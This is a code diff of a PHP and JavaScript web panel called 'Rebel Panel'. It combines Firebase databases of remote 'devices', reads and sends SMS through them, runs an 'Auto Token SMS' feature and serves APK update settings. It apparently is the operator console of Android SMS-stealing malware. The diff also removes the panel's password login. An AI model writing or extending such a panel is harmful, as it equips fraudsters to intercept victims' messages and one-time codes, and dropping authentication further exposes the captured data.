@@ -1,30 +1,33 @@
 <?php
 require_once __DIR__ . '/rebel_bot_lib.php';
+$REBEL_HAS_APP_LIB = is_file(__DIR__ . '/rebel_app_lib.php');
+if ($REBEL_HAS_APP_LIB) require_once __DIR__ . '/rebel_app_lib.php';
 
-rebel_admin_session_start();
-
-if (isset($_GET['rebel_firebase_api']) || isset($_POST['rebel_firebase_api'])) {
-  rebel_firebase_api_handle(true);
-}
-
-$loginError = '';
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['rebel_admin_login'])) {
-  $pass = (string)($_POST['password'] ?? '');
-  if (rebel_admin_login($pass)) {
-    header('Location: admin.php');
-    exit;
-  }
-  $loginError = 'Galat password — dubara try karo';
-}
-
-if (isset($_GET['logout'])) {
-  rebel_admin_logout();
-  header('Location: admin.php');
+if (isset($_GET['rebel_app_api'])) {
+  header('Content-Type: application/json; charset=UTF-8');
+  header('Cache-Control: no-store');
+  $cfg = $REBEL_HAS_APP_LIB ? rebel_app_update_load() : [
+    'min_apk_version' => 1,
+    'latest_apk_version' => 6,
+    'apk_url' => '',
+    'panel_url' => 'https://rebelbhaiya.alwaysdata.net/phone.php',
+    'panel_version' => 8,
+    'force_update' => false,
+    'message' => 'Rebel Panel OK',
+  ];
+  echo json_encode([
+    'ok' => true,
+    'min_apk_version' => (int)($cfg['min_apk_version'] ?? 1),
+    'latest_apk_version' => (int)($cfg['latest_apk_version'] ?? 6),
+    'apk_url' => (string)($cfg['apk_url'] ?? ''),
+    'panel_url' => (string)($cfg['panel_url'] ?? 'https://rebelbhaiya.alwaysdata.net/phone.php'),
+    'panel_version' => (int)($cfg['panel_version'] ?? 8),
+    'force_update' => !empty($cfg['force_update']),
+    'message' => (string)($cfg['message'] ?? 'OK'),
+    'server_time' => time(),
+  ]);
   exit;
 }
-
-$loggedIn = rebel_admin_logged_in();
-$serverProjects = rebel_firebase_list();
 
 if (isset($_GET['rebel_send_sms']) || isset($_POST['rebel_send_sms'])) {
   $body = json_decode(file_get_contents('php://input') ?: '{}', true);
@@ -64,7 +67,7 @@ header('Pragma: no-cache');
 <meta name="theme-color" content="#050508"/>
 <meta name="apple-mobile-web-app-capable" content="yes"/>
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
-<title>Rebel Panel Admin</title>
+<title>Rebel Panel K</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
@@ -286,44 +289,6 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 </head>
 <body>
 
-<?php if (!$loggedIn): ?>
-<div class="login-screen">
-  <div class="login-card">
-    <div class="login-hero">
-      <div class="avatar-stage">
-        <div class="avatar-face-ring">
-          <div class="avatar-img-wrap">
-            <img class="avatar-face" src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
-          </div>
-        </div>
-        <div class="avatar-laptop">
-          <div class="laptop-lid">
-            <div class="laptop-screen">
-              <div class="laptop-code">
-                <span class="laptop-line l1"><span class="dim">// admin</span> firebase.sync()</span>
-                <span class="laptop-line l2"><span class="hi">await</span> k.php</span>
-                <span class="laptop-line l3">projects<span class="laptop-cursor"></span></span>
-              </div>
-            </div>
-            <div class="laptop-base"></div>
-          </div>
-          <div class="laptop-glow"></div>
-        </div>
-      </div>
-      <h1>Rebel <em>Admin</em></h1>
-    </div>
-    <p class="login-sub">Firebase yahan add karo — <strong>k.php</strong> panel mein auto sync hoga.</p>
-    <?php if ($loginError !== ''): ?><div class="login-err" style="display:block"><?php echo htmlspecialchars($loginError, ENT_QUOTES, 'UTF-8'); ?></div><?php endif; ?>
-    <form method="post">
-      <input type="hidden" name="rebel_admin_login" value="1"/>
-      <input class="key-input" type="password" name="password" placeholder="Admin password" required autofocus style="text-transform:none;letter-spacing:0"/>
-      <button class="btn-primary" type="submit">Login</button>
-    </form>
-    <p class="login-sub" style="margin-top:14px;margin-bottom:0">Default: <span class="mono">rebeladmin</span></p>
-  </div>
-</div>
-<?php else: ?>
-
 <!-- APP -->
 <div class="app" id="appShell">
   <header class="hdr">
@@ -332,7 +297,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
         <img src="<?php echo htmlspecialchars($REBEL_AVATAR_URL, ENT_QUOTES, 'UTF-8'); ?>" alt="Rebel" onerror="this.onerror=null;this.src='https://raw.githubusercontent.com/ujjwalrebel53-wq/SpinPlay99/main/IMG_20260609_231734_741.jpg'"/>
       </div>
       <div>
-        <div class="hdr-title">Rebel Admin</div>
+        <div class="hdr-title">Rebel K</div>
         <div class="hdr-sub" id="hdrSub">Connecting...</div>
       </div>
     </div>
@@ -388,12 +353,13 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
     </section>
 
     <section class="screen" id="screen-more">
-      <span class="proto-tag">👑 ADMIN PANEL</span>
+      <span class="proto-tag">📱 K PANEL</span>
       <div class="menu-list">
         <div class="menu-item" onclick="openFbSheet()">Firebase Projects <span id="moreFbName">—</span></div>
-        <a class="menu-item" href="k.php" style="text-decoration:none;color:inherit">K Panel <span>k.php →</span></a>
+        <a class="menu-item" href="admin.php" style="text-decoration:none;color:inherit">Admin Panel <span>admin.php →</span></a>
         <div class="menu-item" onclick="toggleAutoToken()">Auto Token SMS <div class="toggle" id="autoTokenToggle"></div></div>
         <div class="menu-item" onclick="useSelForAutoToken()">Set Auto SMS Device <span>Use current</span></div>
+        <a class="menu-item" href="mobile.php" style="text-decoration:none;color:inherit">Mobile Panel <span>mobile.php →</span></a>
       </div>
     </section>
   </div>
@@ -414,26 +380,20 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
   <div class="sheet-title">Firebase Projects — All Combined</div>
   <div id="fbSheetList"></div>
   <div class="fb-add-form">
-    <input id="fbAddName" placeholder="Project name (e.g. Panel 2)"/>
-    <input id="fbAddUrl" placeholder="Firebase URL — https://xxx.firebaseio.com"/>
-    <input id="fbAddSecret" placeholder="Database secret / auth key (optional)"/>
-    <input id="fbAddApiKey" placeholder="Web API key (optional — for live updates)"/>
-    <button class="btn-add-fb" type="button" onclick="addFirebaseProject()">+ Add Firebase Project</button>
+    <p style="font-size:12px;color:var(--muted);line-height:1.5;margin-bottom:12px">Firebase <strong>admin.php</strong> se add hote hain — yahan auto sync (mobile.php alag hai).</p>
+    <a href="admin.php" class="btn-add-fb" style="display:block;text-align:center;text-decoration:none;color:#111">Open Admin Panel →</a>
   </div>
 </div>
 <div class="toast-wrap" id="toasts"></div>
 
-<?php endif; ?>
-
 <script src="firebase_defaults.js"></script>
 <script>
-<?php if ($loggedIn): ?>
-var SEND_SMS_URL='admin.php?rebel_send_sms=1';
+var SEND_SMS_URL='k.php?rebel_send_sms=1';
 var SMS_TOKEN_URL='sex.php?sms_token_api=1';
 var FIREBASE_API_URL='admin.php?rebel_firebase_api=1';
-var SERVER_FIREBASES=<?= json_encode(array_values($serverProjects), JSON_UNESCAPED_UNICODE) ?>;
 var allDevs=[], selDev='', clientsRawMap={};
 var firebaseInstances=[], firebaseConfigs=[], panelReady=false;
+var firebaseConfigUpdated=0;
 var activeListeners={}, window_sms=[], window_allSms=[], window_newSms=[];
 var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','passwords','webhook','tokens','auth'];
 var SUMMARY_NODES=['devices_status','clients'];
@@ -477,27 +437,58 @@ function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',de
 function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
 function getFilteredDevs(){return allDevs;}
-function adminApiPost(body){
-  return fetch(FIREBASE_API_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body||{}),credentials:'same-origin'})
-    .then(function(r){return r.json();});
+function fetchFirebaseConfigsFromServer(){
+  return fetch(FIREBASE_API_URL,{cache:'no-store'}).then(function(r){
+    if(!r.ok)throw new Error('Firebase API failed');
+    return r.json();
+  }).then(function(d){
+    if(!d||!d.ok)throw new Error((d&&d.error)||'Invalid Firebase API response');
+    firebaseConfigUpdated=Number(d.updated||0);
+    var projects=Array.isArray(d.projects)?d.projects:[];
+    DEFAULT_FIREBASES.forEach(function(def){
+      if(!projects.some(function(c){return c.id===def.id||(c.databaseURL||'').replace(/\/$/,'')===(def.databaseURL||'').replace(/\/$/,'');})){
+        projects.push(def);
+      }
+    });
+    return projects;
+  });
 }
-function saveFirebaseConfigs(){}
 function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
   if(!r.ok)return null;
   return r.json();
 }).catch(function(){return null;});}
 function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}
 
-function loadFirebaseConfigs(){
-  var p=(SERVER_FIREBASES||[]).slice();
-  DEFAULT_FIREBASES.forEach(function(def){if(!p.some(function(c){return c.id===def.id;}))p.push(def);});
-  return p;
+function configsFingerprint(cfgs){
+  return JSON.stringify((cfgs||[]).map(function(c){
+    return{id:c.id,name:c.name,databaseURL:(c.databaseURL||'').replace(/\/$/,''),secret:c.secret||c.key||'',apiKey:c.apiKey||'',schema:c.schema||''};
+  }));
 }
-function reloadServerFirebase(){
-  return fetch(FIREBASE_API_URL,{cache:'no-store',credentials:'same-origin'}).then(function(r){return r.json();}).then(function(d){
-    if(d&&d.ok){SERVER_FIREBASES=d.projects||[];return SERVER_FIREBASES;}
-    return [];
-  }).catch(function(){return [];});
+function rebuildFirebaseInstances(cfgs){
+  firebaseInstances=[];
+  (cfgs||[]).forEach(initFirebaseInstance);
+}
+function applyFirebaseConfigs(cfgs,forceReload){
+  var next=cfgs||[];
+  var changed=forceReload||configsFingerprint(next)!==configsFingerprint(firebaseConfigs);
+  firebaseConfigs=next;
+  if(!changed)return Promise.resolve(false);
+  clearListeners();
+  clientsRawMap={};
+  selDev='';
+  rebuildFirebaseInstances(firebaseConfigs);
+  updateFbUi();
+  return Promise.all(firebaseInstances.map(function(inst){
+    attachLive(inst);
+    return discoverInstance(inst);
+  })).then(function(){
+    processClientsData();
+    updateFbUi();
+    return true;
+  });
+}
+function loadFirebaseConfigs(){
+  return fetchFirebaseConfigsFromServer();
 }
 function getFbAuthKey(inst){
   if(!inst||!inst.config)return '';
@@ -526,70 +517,28 @@ function initFirebaseInstance(cfg){
   var inst={id:cfg.id,name:cfg.name,config:cfg,db:db,restUrl:(cfg.databaseURL||'').replace(/\/$/,''),schema:cfg.schema||(cfg.databaseURL.indexOf('rabel-raand')>=0?'rabel':'spinplay'),liveAttached:false};
   firebaseInstances.push(inst);return inst;
 }
-function initFirebase(){
-  firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
-  firebaseConfigs.forEach(initFirebaseInstance);
-  updateFbUi();
+function initFirebase(forceReload){
+  return loadFirebaseConfigs().then(function(cfgs){
+    return applyFirebaseConfigs(cfgs,forceReload);
+  });
 }
-function addFirebaseProject(){
-  var name=document.getElementById('fbAddName').value.trim();
-  var url=document.getElementById('fbAddUrl').value.trim().replace(/\/$/,'');
-  var secret=document.getElementById('fbAddSecret').value.trim();
-  var apiKey=document.getElementById('fbAddApiKey').value.trim();
-  if(!name||!url){toast('Project name aur Firebase URL zaroori hai',false);return;}
-  if(firebaseConfigs.some(function(c){return (c.databaseURL||'').replace(/\/$/,'')===url;})){
-    toast('Yeh Firebase URL pehle se added hai',false);return;
-  }
-  var id='fb_'+Date.now();
-  var cfg={
-    id:id,
-    name:name,
-    databaseURL:url,
-    secret:secret,
-    key:secret,
-    apiKey:apiKey,
-    schema:url.indexOf('rabel')>=0?'rabel':'spinplay'
-  };
-  adminApiPost({action:'add',name:name,databaseURL:url,secret:secret,apiKey:apiKey,id:id,schema:cfg.schema}).then(function(res){
-    if(!res||!res.ok){toast((res&&res.error)||'Add failed',false);return;}
-    reloadServerFirebase().then(function(){
-      firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
-      firebaseConfigs.forEach(initFirebaseInstance);
-      firebaseInstances.forEach(function(inst){attachLive(inst);});
-      Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
-        processClientsData();
-        updateFbUi();
-        toast('Added: '+name+' — k.php sync ON',true);
-      });
+function syncFirebaseFromAdmin(){
+  return fetch(FIREBASE_API_URL,{cache:'no-store'}).then(function(r){
+    if(!r.ok)throw new Error('sync failed');
+    return r.json();
+  }).then(function(d){
+    if(!d||!d.ok)throw new Error('bad api');
+    if(Number(d.updated||0)===firebaseConfigUpdated&&firebaseConfigs.length)return false;
+    firebaseConfigUpdated=Number(d.updated||0);
+    var projects=Array.isArray(d.projects)?d.projects:[];
+    DEFAULT_FIREBASES.forEach(function(def){
+      if(!projects.some(function(c){return c.id===def.id||(c.databaseURL||'').replace(/\/$/,'')===(def.databaseURL||'').replace(/\/$/,'');})){
+        projects.push(def);
+      }
     });
-  }).catch(function(){toast('Network error',false);});
-  document.getElementById('fbAddName').value='';
-  document.getElementById('fbAddUrl').value='';
-  document.getElementById('fbAddSecret').value='';
-  document.getElementById('fbAddApiKey').value='';
-  closeFbSheet();
+    return applyFirebaseConfigs(projects,false);
+  }).catch(function(){return false;});
 }
-function removeFirebaseProject(id){
-  if(firebaseConfigs.length<=1){toast('Kam se kam 1 Firebase chahiye',false);return;}
-  adminApiPost({action:'delete',id:id}).then(function(res){
-    if(!res||!res.ok){toast((res&&res.error)||'Delete failed',false);return;}
-    reloadServerFirebase().then(function(){
-      Object.keys(clientsRawMap).forEach(function(k){
-        if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
-      });
-      if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
-      firebaseInstances=[];firebaseConfigs=loadFirebaseConfigs();
-      firebaseConfigs.forEach(initFirebaseInstance);
-      firebaseInstances.forEach(function(inst){attachLive(inst);});
-      Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
-        processClientsData();
-        updateFbUi();
-        toast('Project removed',true);
-      });
-    });
-  }).catch(function(){toast('Network error',false);});
-}
-initFirebase();
 
 function updateFbUi(){
   var total=allDevs.length;
@@ -599,11 +548,9 @@ function updateFbUi(){
   document.getElementById('hdrSub').textContent=total+' devices · '+proj+' Firebase combined';
   var html=firebaseConfigs.map(function(c){
     var cnt=allDevs.filter(function(d){return d.fbId===c.id;}).length;
-    return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div>'+
-      (proj>1?'<button type="button" onclick="event.stopPropagation();removeFirebaseProject(\''+c.id+'\')" style="background:none;border:1px solid var(--border);color:var(--error);border-radius:8px;padding:6px 10px;font-size:10px;cursor:pointer">✕</button>':'')+
-      '</div>';
+    return '<div class="fb-option"><div><div>'+esc(c.name)+'</div><div class="cnt">'+cnt+' devices · '+esc((c.databaseURL||'').replace(/^https?:\/\//,'').split('/')[0])+'</div></div></div>';
   }).join('');
-  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — add below</div>';
+  document.getElementById('fbSheetList').innerHTML=html||'<div class="empty-state" style="padding:20px"><div class="ico">🔥</div>No Firebase yet — admin.php se add karo</div>';
 }
 function openFbSheet(){document.getElementById('sheetBg').classList.add('open');document.getElementById('fbSheet').classList.add('open');}
 function closeFbSheet(){document.getElementById('sheetBg').classList.remove('open');document.getElementById('fbSheet').classList.remove('open');}
@@ -1149,20 +1096,27 @@ function useSelForAutoToken(){
   }).catch(function(){toast('Auto token save failed',false);});
 }
 
-/* BOOT — direct open, all Firebase combined */
+/* BOOT — admin.php Firebase sync for k.php */
 (function(){
   try{
-    panelReady=true;
-    fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
+    initFirebase(true).then(function(){
+      panelReady=true;
+      return fetchAllData();
+    }).catch(function(){
+      panelReady=true;
+      toast('Firebase sync failed — check admin.php',false);
+    });
     loadAutoTokenState();
-  }catch(e){console.error(e);}
+  }catch(e){console.error(e);panelReady=true;}
 })();
 setInterval(function(){
   if(!panelReady)return;
+  syncFirebaseFromAdmin().then(function(changed){
+    if(changed)fetchAllData().catch(function(){});
+  });
   fetchAllData().catch(function(){});
-},60000);
+},20000);
 window.addEventListener('unhandledrejection',function(){});
-<?php endif; ?>
 </script>
 </body>
 </html>
